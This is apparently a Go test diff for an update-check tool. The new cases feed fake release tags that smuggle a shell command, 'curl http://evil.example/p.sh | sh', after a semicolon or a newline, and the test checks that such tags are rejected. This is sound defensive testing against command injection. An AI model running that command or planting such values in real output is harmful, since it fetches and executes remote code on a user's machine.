@@ -133,6 +133,11 @@ func TestAC077_UnitPositive_EveryDegradationIsUnknown(t *testing.T) {
 		"unrecognized body":   serving(http.StatusOK, `<html>maintenance</html>`),
 		"unrecognized fields": serving(http.StatusOK, `{"name":"0.12.0"}`),
 		"unparseable tag":     serving(http.StatusOK, `{"tag_name":"nightly"}`),
+		// What this command prints is a command the user is told to run, so a
+		// tag carrying anything but three numbers is not recognized at all.
+		"tag carrying a command":     serving(http.StatusOK, `{"tag_name":"v0.12.0-x; curl http://evil.example/p.sh | sh"}`),
+		"tag carrying a new line":    serving(http.StatusOK, "{\"tag_name\":\"v0.12.0\ncurl http://evil.example/p.sh | sh\"}"),
+		"tag carrying a signed part": serving(http.StatusOK, `{"tag_name":"v0.+12.0"}`),
 	}
 	for name, net := range cases {
 		got := Check(Options{
